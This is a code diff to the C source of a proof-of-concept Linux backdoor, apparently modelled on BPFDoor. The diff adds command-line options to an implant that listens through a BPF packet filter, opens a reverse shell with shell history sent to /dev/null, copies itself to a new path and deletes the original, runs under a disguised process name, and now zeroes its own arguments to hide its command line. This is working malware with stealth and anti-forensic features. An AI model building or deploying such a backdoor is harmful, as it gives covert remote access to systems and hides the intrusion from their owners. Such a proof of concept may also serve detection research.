@@ -16,6 +16,7 @@
 #include <linux/if_ether.h>
 #include <linux/filter.h>
 #include <fcntl.h>
+#include <getopt.h>
 
 #include "shared.h"
 
@@ -23,11 +24,12 @@ const char *pidfile = PID_FILENAME;
 
 void apply_bpf_filter(int sd);
 void reverse_shell(char *host, int port);
-void pid_or_die();
-char *copy_bin();
-void delete_bin();
-void exec_copy_with_init(char *path);
+void pid_or_die(int opts);
+char *copy_bin(int opts);
+void delete_bin(int opts);
+void exec_copy_with_init(int opts, char *path);
 void unlink_pidfile();
+void clean_args(int opts, int argc, char *argv[]);
 
 char *copy_path();
 
@@ -36,21 +38,57 @@ void sig_term(int sig) {
 	exit(0);
 }
 
+#define BOP_INIT (1 << 0)
+#define BOP_NOCOPY (1 << 1)
+#define BOP_NOPID (1 << 2)
+#define BOP_NOENV (1 << 3)
+
 int main(int argc, char *argv[]) {
 	int sd, pkt_size;
 	char *buf;
 	/* struct sockaddr_in src, dst; */
 	/* struct iphdr *ip_pkt; */
 
-	if (argc > 1 && strcmp(argv[1], "--init") == 0) {
-		pid_or_die();
+        unsigned int opts = 0;
+
+        while (1) {
+		int opt_idx;
+		// important: order of args must align with opts mask
+		static struct option long_options[] = {
+			{"init",   no_argument, 0, 0},
+			{"nocopy", no_argument, 0, 0},
+			{"nopid",  no_argument, 0, 0},
+			{"noenv",  no_argument, 0, 0},
+			{0, 0, 0, 0}
+		};
+		char c = getopt_long(argc, argv, "", long_options, &opt_idx);
+		if (c == -1) break;
+
+		switch (c) {
+		case 0:
+			printf("option %s", long_options[opt_idx].name);
+			if (optarg)
+				printf(" with arg %s", optarg);
+			printf("\n");
+
+			opts = opts | (1 << opt_idx);
+			break;
+		default:
+			printf("?? getopt return character code 0%o ??\n", c);
+			break;
+		}
+	}
+
+	if (opts & BOP_INIT) {
+		pid_or_die(opts);
+		clean_args(opts, argc, argv);
 	} else {
-		char *path = copy_bin();
+		char *path = copy_bin(opts);
 		if (fork() == 0) {
-			exec_copy_with_init(path);
+			exec_copy_with_init(opts, path);
 			exit(0);
 		}
-		delete_bin();
+		delete_bin(opts);
 		exit(0);
 	}
 
@@ -202,8 +240,11 @@ void reverse_shell(char *host, int port) {
 		NULL
 	};
 	char *env[] = {
+		"HOME=/tmp",
 		"HISTFILE=/dev/null",
 		"MYSQL_HISTFILE=/dev/null",
+		"PATH=/bin:/usr/kerberos/sbin:/usr/kerberos/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/bin:./bin",
+		"TERM=vt100",
 		NULL
 	};
 	execve("/bin/sh", args, env);
@@ -213,7 +254,9 @@ void unlink_pidfile() {
 	unlink(pidfile);
 }
 
-void pid_or_die() {
+void pid_or_die(int opts) {
+	if (opts & BOP_NOPID) return;
+
 	struct stat sb;
 
 	// die if pid file exists
@@ -240,13 +283,16 @@ int bin_path(char *path) {
 	return readlink("/proc/self/exe", path, 256-1);
 }
 
-char *copy_bin() {
+char *copy_bin(int opts) {
 	static char path[256];
 	ssize_t len;
 	char buf[1024];
 
 	len = bin_path(path);
 	if (len == -1) exit(0); // couldn't read self. exit
+
+	// we're not copying, return original path
+	if (opts & BOP_NOCOPY) return path;
 
 	fprintf(stderr, "copy %s to %s\n", path, copy_path());
 
@@ -272,7 +318,9 @@ char *copy_bin() {
 	return copy_path();
 }
 
-void delete_bin() {
+void delete_bin(int opts) {
+	if (opts & BOP_NOCOPY) return;
+
 	static char path[256];
 	ssize_t len;
 
@@ -298,17 +346,23 @@ char *copy_path() {
 	return path;
 }
 
-void exec_copy_with_init(char *path) {
-	fprintf(stderr, "execing %s\n", copy_path());
+void exec_copy_with_init(int opts, char *path) {
+	fprintf(stderr, "execing %s\n", path);
 
 	// shell arguments and environment
 	char *args[] = {
 		"bpfdoorpoc: resident process",
 		"--init",
+		(opts & BOP_NOPID) ? "--nopid" : NULL,
 		NULL
 	};
 	char *env[] = {
 		NULL
 	};
 	execve(path, args, env);
+}
+
+void clean_args(int opts, int argc, char *argv[]) {
+	for (int i = 1; i < argc; i++)
+		memset(argv[i], 0, strlen(argv[i]));
 }
